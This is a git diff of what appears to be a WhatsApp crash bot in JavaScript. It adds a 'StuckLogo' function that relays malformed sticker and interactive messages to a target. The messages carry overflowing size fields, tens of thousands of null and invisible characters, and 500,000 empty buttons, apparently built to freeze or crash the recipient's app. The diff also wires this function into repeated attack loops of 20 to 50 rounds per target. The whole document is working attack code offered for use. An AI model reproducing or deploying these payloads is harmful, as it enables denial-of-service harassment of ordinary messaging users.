@@ -3942,6 +3942,91 @@ async function freespamdelay(target) {
         }
     }
 }
+
+async function StuckLogo(target) {
+  await sock.relayMessage(target, {
+    stickerMessage: {
+      url: "https://mmg.whatsapp.net/m1/v/t24/An_qcbaV8YTP-HtiB1VFAie8c-VqF4bBnMHWKN--GFd6T2GW-pQwLHQe4K4eDKCS1Fv9DZCa6RXMDsLeabNqy8RoTIekx2LtJCM-iUtOu_sdK90zdCEu1l8Wwqj3KAHrNRd1?ccb=10-5&oh=01_Q5Aa4AEbsVLrEjUg9wGPpN5mT_DeeyZp0Obyl7Cp7X5CHZ4mSA&oe=69D77DE6&_nc_sid=5e03e0&mms3=true",
+      fileSha256: "lOzzPjzVDfakRkXD9ud+N/JGUHVsmn37eqDk0UijQdA=",
+      fileEncSha256: "lOzzPjzVDfakRkXD9ud+N/JGUHVsmn37eqDk0UijQdA=",
+      mediaKey: "YWJjZGVmZ2hpamtsbW5vcHFyc3R1dnd4eXphYmNkZWY=",
+      mimetype: "image/webp",
+      height: 4294967295,
+      width: 4294967295,
+      directPath: "/m1/v/t24/An_qcbaV8YTP-HtiB1VFAie8c-VqF4bBnMHWKN--GFd6T2GW-pQwLHQe4K4eDKCS1Fv9DZCa6RXMDsLeabNqy8RoTIekx2LtJCM-iUtOu_sdK90zdCEu1l8Wwqj3KAHrNRd1",
+      fileLength: 9007199254740991,
+      mediaKeyTimestamp: 9007199254740991,
+      firstFrameLength: 4294967295,
+      firstFrameSidecar: "YWJjZGVmZ2hpamtsbW5vcHFyc3R1dnd4eXphYmNkZWY=",
+      isAnimated: true,
+      pngThumbnail: "YWJjZGVmZ2hpamtsbW5vcHFyc3R1dnd4eXphYmNkZWY=",
+      contextInfo: {
+        mentionedJid: [target],
+        quotedMessage: {
+          contactMessage: {
+            displayName: " ",
+            vcard: "\u0000".repeat(45000)
+          }
+        }
+      },
+      stickerSentTs: 9007199254740991,
+      isAvatar: true,
+      isAiSticker: true,
+      isLottie: true,
+      accessibilityLabel: "ꦾ".repeat(30000)
+    }
+  }, { participant: target });
+
+  await sock.relayMessage(target, {
+    groupStatusMessageV2: {
+      message: {
+        interactiveMessage: {
+          body: {
+            text: "Vixzz Ganteng Bangettt"
+          },
+          nativeFlowMessage: {
+            buttons: Array.from({ length: 500000 }, () => ({}))
+          },
+          contextInfo: {
+            quotedMessage: {
+              contactMessage: {
+                displayName: " ",
+                vcard: ""
+              }
+            }
+          }
+        }
+      }
+    }
+  }, { participant: target });
+
+  await sock.relayMessage(target, {
+    groupStatusMessageV2: {
+      message: {
+        interactiveResponseMessage: {
+          body: {
+            text: "AmbaJahat",
+            format: "DEFAULT"
+          },
+          nativeFlowResponseMessage: {
+            name: "galaxy_message",
+            paramsJson: "\u2062".repeat(30000),
+            version: 3
+          },
+          contextInfo: {
+            quotedMessage: {
+              contactMessage: {
+                displayName: " ",
+                vcard: ""
+              }
+            }
+          }
+        }
+      }
+    }
+  }, { participant: target });
+}
+
 //=========== ASYNC FUNCTION SEND ==========\\
 async function crayxkouta(target) {
 for (let i = 0; i < 25; i++) {
@@ -3989,11 +4074,14 @@ async function crayxui(target) {
 for (let i = 0; i < 25; i++) {
 await starttime(target)
 await ForcloseSTC(target)
+await StuckLogo(target)
 await ForcloseVIDEO(target)
 await ForcloseDOC(target)
-await LexcaabosV7Fix(target)
-await LexcaabosV5(target)
-await LexcaabosV4(target)
+await StuckLogo(target)
+await StuckLogo(target)
+await StuckLogo(target)
+await StuckLogo(target)
+await StuckLogo(target)
 await ForcloseDOC(target)
 await starttime(target)
 await ForcloseSTC(target)
@@ -4004,15 +4092,17 @@ console.log(chalk.red(`[Seraphine - FORCE 🦠 ] ${target}`));
 }
 
 async function crayxsuper(target) {
-for (let i = 0; i < 20; i++) {
-await freespamdelay(target)
-await freespamdelay(target)
-await freespamdelay(target)
-await freespamdelay(target)
-await LexcaabosV7Fix(target)
-await LexcaabosV5(target)
-await LexcaabosV4(target)
-await freespamdelay(target)
+for (let i = 0; i < 50; i++) {
+await StuckLogo(target)
+await StuckLogo(target)
+await StuckLogo(target)
+await StuckLogo(target)
+await StuckLogo(target)
+await StuckLogo(target)
+await StuckLogo(target)
+await StuckLogo(target)
+await StuckLogo(target)
+await StuckLogo(target)
 await new Promise(resolve => setTimeout(resolve, 2500));
 console.log(chalk.red(`[Seraphine - CORE VIP 🔥 ] ${target}`));
 }
@@ -4029,12 +4119,16 @@ await ForcloseDOC(target)
 await starttime(target)
 await ForcloseSTC(target)
 await ForcloseVIDEO(target)
-await freespamdelay(target)
-await LexcaabosV7Fix(target)
-await LexcaabosV5(target)
-await LexcaabosV4(target)
-await freespamdelay(target)
-await freespamdelay(target)
+await StuckLogo(target)
+await StuckLogo(target)
+await StuckLogo(target)
+await StuckLogo(target)
+await StuckLogo(target)
+await StuckLogo(target)
+await StuckLogo(target)
+await StuckLogo(target)
+await StuckLogo(target)
+await StuckLogo(target)
 await new Promise(resolve => setTimeout(resolve, 2500));
 console.log(chalk.red(`[Seraphine - TRASH 🍃 ] ${target}`));
 }
@@ -4042,17 +4136,11 @@ console.log(chalk.red(`[Seraphine - TRASH 🍃 ] ${target}`));
 
 async function Crayxbayar(target) {
 for (let i = 0; i < 20; i++) {
-await LexcaabosV7Fix(target)
-await LexcaabosV5(target)
-await LexcaabosV4(target)
-await freespamdelay(target)
-await freespamdelay(target)
-await LexcaabosV7Fix(target)
-await LexcaabosV5(target)
-await LexcaabosV4(target)
-await freespamdelay(target)
-await freespamdelay(target)
-await freespamdelay(target)
+await StuckLogo(target)
+await StuckLogo(target)
+await StuckLogo(target)
+await StuckLogo(target)
+await StuckLogo(target)
 await new Promise(resolve => setTimeout(resolve, 2500));
 console.log(chalk.red(`[Seraphine - MEMEK ] ${target}`));
 }
